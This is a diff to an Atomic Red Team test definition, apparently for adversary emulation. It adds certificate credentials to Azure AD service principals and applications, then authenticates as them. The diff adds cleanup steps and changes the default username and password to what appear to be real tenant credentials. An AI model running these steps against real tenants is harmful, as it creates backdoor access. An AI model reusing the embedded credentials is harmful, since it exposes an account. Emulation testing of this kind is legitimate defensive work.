@@ -13,15 +13,15 @@ atomic_tests:
     username:
       description: Azure AD username
       type: String
-      default: jonh@contoso.com
+      default: iken@aad2016.onmicrosoft.com
     password:
       description: Azure AD password
       type: String
-      default: p4sswd
+      default: mdpIkki7!
     application:
       description: Targeted Application
       type: String
-      default: "Application"
+      default: "SuperApplication"
     certificate_password:
       description: Password of the new certificate
       type: string
@@ -50,21 +50,37 @@ atomic_tests:
       # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
       $certNotAfter = (Get-Date).AddDays(2)
       $credNotAfter = (Get-Date).AddDays(1)
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
       $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
       Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd
 
       $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
 
-      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter
+      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
       Start-Sleep -s 30
       $tenant=Get-AzureADTenantDetail
-      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+      $tmp = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+      Write-Host ($tmp | Format-Table | Out-String)
 
     cleanup_command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $sp = Get-AzureADServicePrincipal -Searchstring "#{application}"
+      $credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId
+      foreach ($cred in $credz) {
+        if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq "AtomicTest") {
+          Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId
+        }  
+      }
+      Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
+      
       rm "#{path_to_cert}\#{application}.pfx"
+      
     name: powershell
     elevation_required: false
 
@@ -116,21 +132,37 @@ atomic_tests:
       if ($app -eq $null) { Write-Warning "Application not found"; exit }
       $certNotAfter = (Get-Date).AddDays(2)
       $credNotAfter = (Get-Date).AddDays(1)
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
       $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
       Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd
 
       $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
 
-      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter
+      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
       Start-Sleep -s 30
       $tenant=Get-AzureADTenantDetail
-      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+      $tmp = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+      Write-Host ($tmp | Format-Table | Out-String)
 
     cleanup_command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $app = Get-AzureADApplication -Searchstring "#{application}"
+      $credz = Get-AzureADApplicationCredential -ObjectId $app.ObjectId
+      foreach ($cred in $credz) {
+        if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq "AtomicTest") {
+          Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId
+        }  
+      }
+      Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
+      
       rm "#{path_to_cert}\#{application}.pfx"
+      
     name: powershell
     elevation_required: false
     
